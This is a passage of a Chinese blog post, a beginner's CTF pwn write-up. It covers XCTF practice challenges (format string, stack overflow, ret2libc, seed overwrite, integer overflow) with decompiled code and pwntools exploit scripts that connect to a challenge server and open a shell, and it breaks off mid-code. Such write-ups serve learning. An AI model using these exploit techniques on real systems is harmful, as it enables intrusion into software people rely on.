@@ -1,0 +1,1093 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://sina.wuuconix.link/large/007YVyKcly1h1w9ogawmvj30jg0jgtdg.jpg">
+  <link rel="icon" href="https://sina.wuuconix.link/large/007YVyKcly1h1w9ogawmvj30jg0jgtdg.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="wuuconix">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="写在前面 作为一个半退役的CTF web选手，在大三上学习了编译原理和操作系统原理之后，感觉可以学习pwn了！下面写一下在buu和攻防世界上pwn专题的刷题记录。  攻防世界  1.CGfsb 作为攻防世界pwn新手区的第一题，它的考点是printf函数的格式化字符串漏洞。 利用IDA64进行反编译后，在main函数中，我们发现了以下代码。 12345if ( pwnme &#x3D;&#x3D; 8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN PWN PWN！">
+<meta property="og:url" content="https://wuuconix.link/2022/01/30/pwn/index.html">
+<meta property="og:site_name" content="wuuconix&#39;s blog">
+<meta property="og:description" content="写在前面 作为一个半退役的CTF web选手，在大三上学习了编译原理和操作系统原理之后，感觉可以学习pwn了！下面写一下在buu和攻防世界上pwn专题的刷题记录。  攻防世界  1.CGfsb 作为攻防世界pwn新手区的第一题，它的考点是printf函数的格式化字符串漏洞。 利用IDA64进行反编译后，在main函数中，我们发现了以下代码。 12345if ( pwnme &#x3D;&#x3D; 8">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sina.wuuconix.link/large/007YVyKcly1h3o1intoqrj31070k1dk7.jpg">
+<meta property="article:published_time" content="2022-01-30T18:15:56.000Z">
+<meta property="article:modified_time" content="2022-02-15T18:15:56.000Z">
+<meta property="article:author" content="wuuconix">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sina.wuuconix.link/large/007YVyKcly1h3o1intoqrj31070k1dk7.jpg">
+  
+  
+  
+  <title>PWN PWN PWN！ - wuuconix&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/toubudaziji.css">
+<link rel="stylesheet" href="/css/gundongtiao.css">
+<link rel="stylesheet" href="/css/APlayer.min.css">
+<link rel="stylesheet" href="/css/scrollbar.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_3317131_6niuojsefqt.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wuuconix.link","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Tpnm8c3kMWvXEXe6TN9JQnvb-gzGzoHsz","app_key":"1I9i7nfFTc4ulrrtGwfite4s","server_url":"https://tpnm8c3k.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wuuconix's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>wuuconix</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://sina.wuuconix.link/large/007YVyKcly1h3o1j3euv3j31hc0u0k0n.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PWN PWN PWN！"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-30 18:15" pubdate>
+          2022年1月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          141 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PWN PWN PWN！</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年2月15日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <header><meta name="referrer" content="never"></header>
+
+    <div id="aplayer-MBEDHQNJ" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1830411330" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
+    ></div>
+<h2 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h2>
+<p>作为一个半退役的CTF web选手，在大三上学习了编译原理和操作系统原理之后，感觉可以学习pwn了！下面写一下在buu和攻防世界上pwn专题的刷题记录。</p>
+<h2 id="攻防世界"><a class="markdownIt-Anchor" href="#攻防世界"></a> 攻防世界</h2>
+<h3 id="1cgfsb"><a class="markdownIt-Anchor" href="#1cgfsb"></a> 1.CGfsb</h3>
+<p>作为攻防世界pwn新手区的第一题，它的考点是printf函数的格式化字符串漏洞。</p>
+<p>利用IDA64进行反编译后，在main函数中，我们发现了以下代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )<br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you pwned me, here is your flag:\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>只要pwnme为8，我们就能获得flag。而在该题中，我们传入的一个参数s将直接作为printf的参数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">fgets(s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-comment">//...</span><br><span class="hljs-built_in">printf</span>(s); <span class="hljs-comment">//漏洞所在点</span><br></code></pre></td></tr></table></figure>
+<p>实际上我们可以往s这个字符串里输入一个格式化的内容，比如 <code>%s</code>之类的，在c提供的一些格式化符号中，利用 <code>%n</code>可以实现内存任意写，理论上代码里定义的变量，我们都可以进行修改。</p>
+<p>但是由于我十分菜，还不太会写payload，但是pwntools中提供了一个函数<code>fmtstr_payload</code>，只要我们输入一些参数，pwntools就能帮助我们快速构建payload。</p>
+<p><code>fmstr_payload</code>需要传递的参数主要是 偏移量offset 和一个字典，字典内部的key表示你要修改的变量的内存地址，value则表示修改后的值。</p>
+<p>而这个offset是一个神秘的值，我不太理解它到底是什么，但是能够模仿大佬们的wp知道怎么求出这个值。</p>
+<ol>
+<li>
+<p>使用 AAAA %08x %08x %08x…的方式，找到41414141所在的位置，即offset</p>
+<p><img src="https://upyun.wuuconix.link/image-20220130180617501.png" srcset="/img/loading.gif" lazyload alt="%08x get offset" /></p>
+</li>
+<li>
+<p>和第一种类似，只不过把%08x 换成 %p</p>
+<p><img src="https://upyun.wuuconix.link/image-20220130180717003.png" srcset="/img/loading.gif" lazyload alt="%p" /></p>
+</li>
+</ol>
+<p>实际情况下，%08x或者%p的数量可以多一些，这样某个神秘的指针就会在一次次调用中不断往后，直到找到41414141，即AAAA的ascii值，你就获得了你能够控制的格式化字符串的offset 偏移量。</p>
+<p>然后第二个参数字典就非常容易了，在这道题中我们需要改变的pwnme变量的地址是 0x0804A068，然后想要改变为的值是8，我们就这样写来构造payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = fmtstr_payload(<span class="hljs-number">10</span>, &#123;<span class="hljs-number">0x080A4068</span>: <span class="hljs-number">8</span>&#125;)<br></code></pre></td></tr></table></figure>
+<p>最终的payload如下。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./cgfsb&#x27;</span>)<br><span class="hljs-comment"># sh = remote(&quot;111.200.241.244&quot;, 64676)</span><br><br>pwnme_addr = <span class="hljs-number">0x0804A068</span><br>sh.sendline(<span class="hljs-string">&quot;wuuconix&quot;</span>)<br>payload = fmtstr_payload(<span class="hljs-number">10</span>, &#123; pwnme_addr: <span class="hljs-number">8</span> &#125;)<br>sh.recvuntil(<span class="hljs-string">&quot;please:\n&quot;</span>)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="2level0"><a class="markdownIt-Anchor" href="#2level0"></a> 2.level0</h3>
+<p>最简单的栈溢出。</p>
+<p>栈溢出的思想就是通过程序中没有控制输入的长度，从而超出了某个变量应该限制的范围，影响到了外面的return之类的东西，从而进行程序流的劫持，比如我们把本来return后程序就结束了，然后我们把return的返回地址指导了一个backdoor函数，而这个后门函数一般就是一个shell，我们可以用来 cat flag。</p>
+<p>在这道题中，我们利用IDA64可以看到一个<code>vulnerable_function</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>按理说buf字符串的长度应该只有128，但是这个程序却用read读了0x200这么长，即512的长度。</p>
+<p>所以我们在把正常buf的内容用随便一些字符覆盖完后，我们就可以进行一些劫持工作了。</p>
+<p>在IDA64中双击buf变量，我们可以看到buf的栈使用情况。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220130185135716.png" srcset="/img/loading.gif" lazyload alt="buf stack" /></p>
+<p>我们可以看到buf 有0x80个空间，然后就是一个s和r。</p>
+<p>这两个具体是啥我也不太懂，但是我们可以通过覆盖<strong>r</strong>中的值从而改变程序流向。</p>
+<p>该程序中还存在一个<code>callsystem</code>函数，很显然，这就是我们期盼的后门函数了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">callsystem</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>然后我们很容易写出payload脚本如下。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&quot;./level0&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">52435</span>)<br>sys_addr = <span class="hljs-number">0x0400596</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>) + p64(sys_addr)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="3level2"><a class="markdownIt-Anchor" href="#3level2"></a> 3.level2</h3>
+<p>这道题便是ctfwiki pwn中basic rop中的ret2libc例1的情况。</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
+<p>该题首先对由于read函数读取的字符个数大于变量本身的限制，存在栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+0h] [ebp-88h] BYREF</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这道题中和level0不同，level0属于 ret2txt，即return回到已有的代码上，因为上题中的callsystem函数能够直接get shell，我们直接返回到它的地址即可。可惜这道题里没有这样成品的后门函数。</p>
+<p>但是从IDA中我们可以看到代码有system函数，也有<code>/bin/sh</code>这个字符串，我们可以将他们进行按照函数调用的规则入栈，从而get shell。</p>
+<p>入栈规则 首先传入system函数的plt地址，然后传入一个返回地址，最后传参数的地址。</p>
+<p>这个返回地址我们可以随便写，为了凑足一个字（这道题是32位的，即4个字节），我们可以传4个字符作为返回地址。</p>
+<p>这道题的payload代码里，我根据ctfwiki，使用了pwntools中flat函数，它可以让你免于写类似<code>b'a'</code>和<code>p32</code>这种煞风景的结构，而自动帮你构建符合要求的payload。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">60184</span>)<br><span class="hljs-comment"># sh = process(&quot;./level1&quot;)</span><br>system_plt = <span class="hljs-number">0x08048320</span><br>binsh_addr = <span class="hljs-number">0x0804A024</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">136</span> + <span class="hljs-number">4</span>), system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="4get_shell"><a class="markdownIt-Anchor" href="#4get_shell"></a> 4.get_shell</h3>
+<p>突然发现攻防世界的题目顺序每次都在变，那有点狗了。这道明明应该放在第一道的。</p>
+<p>nc过去就是shell。以下是它的main函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK,this time we will get a shell.&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="5hello_pwn"><a class="markdownIt-Anchor" href="#5hello_pwn"></a> 5.hello_pwn</h3>
+<p>最简单的栈溢出。main函数如下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  alarm(<span class="hljs-number">0x3C</span>u);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;~~ welcome to ctf ~~     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;lets get helloworld for bof&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;unk_601068, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">if</span> ( dword_60106C == <span class="hljs-number">1853186401</span> )<br>    sub_400686();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>利用read函数读了16个字符，而unk_601068这个变量实际上只占4个空间，我们可以影响到栈下面的dword_60106C。把下面那个变量设置为1853186401即可获得flag。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220201112957824.png" srcset="/img/loading.gif" lazyload alt="栈情况" /></p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&#x27;./hello_pwn&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">49499</span>)<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1853186401</span>])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="6guess_num"><a class="markdownIt-Anchor" href="#6guess_num"></a> 6.guess_num</h3>
+<p>仍然是栈溢出。但是这道题我不太明白为什么不能直接移除到ret2text的方式，直接去调用cat flag的函数，可能是和该题开启了canary的方式（运行过程中没有报错就挺奇怪的</p>
+<p><img src="https://upyun.wuuconix.link/image-20220201195221937.png" srcset="/img/loading.gif" lazyload alt="最终猜数成功调用的函数" /></p>
+<p>看了网上的wp，利用溢出去改变随机数的种子，让其产生的随机数固定，然后我们就能成功猜数，通过正常的程序流cat flag。总结一下就是利用栈溢出了，但是没有完全利用。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">-<span class="hljs-number">0000000000000030</span> var_30          db <span class="hljs-number">32</span> <span class="hljs-built_in">dup</span>(?) <span class="hljs-comment">//这是我们gets的那个变量</span><br>-<span class="hljs-number">0000000000000010</span> seed            <span class="hljs-selector-tag">dd</span> <span class="hljs-number">2</span> <span class="hljs-built_in">dup</span>(?)  <span class="hljs-comment">//wp需要改变这个</span><br>-<span class="hljs-number">0000000000000008</span> var_8           dq ?<br>+<span class="hljs-number">0000000000000000</span>  s              db <span class="hljs-number">8</span> <span class="hljs-built_in">dup</span>(?)<br>+<span class="hljs-number">0000000000000008</span>  r              db <span class="hljs-number">8</span> <span class="hljs-built_in">dup</span>(?)  <span class="hljs-comment">//为什么不能直接rop，可能是Cannary作怪</span><br></code></pre></td></tr></table></figure>
+<p>在看wp的过程中，还了解到在python中利用<code>ctypes</code>能够导入一个libc库从而直接运行c函数，非常牛皮。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> cdll<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># sh = process(&#x27;./guess_num&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">55235</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">1</span>)<br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>, <span class="hljs-number">1</span>]) <span class="hljs-comment">#将seed置为1</span><br>sh.sendline(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    num = <span class="hljs-built_in">str</span>(libc.rand() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;number:&quot;</span>)<br>    sh.sendline(num)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="7int_overflow"><a class="markdownIt-Anchor" href="#7int_overflow"></a> 7.int_overflow</h3>
+<p>本题中有strcpy函数提供栈溢出条件，同时题目设置了一道关卡，必须想到整数溢出通过关卡后才能去利用栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *__cdecl <span class="hljs-title function_">check_passwd</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span><br>&#123;<br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">11</span>]; <span class="hljs-comment">// [esp+4h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span><br><br>  v3 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> ) <span class="hljs-comment">//这里需要利用整数溢出绕过，因为我们的payload大于8个字节，可以使用260~263个字节的payload来绕过</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Password&quot;</span>);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">char</span> *)fflush(<span class="hljs-built_in">stdout</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcpy</span>(dest, s); <span 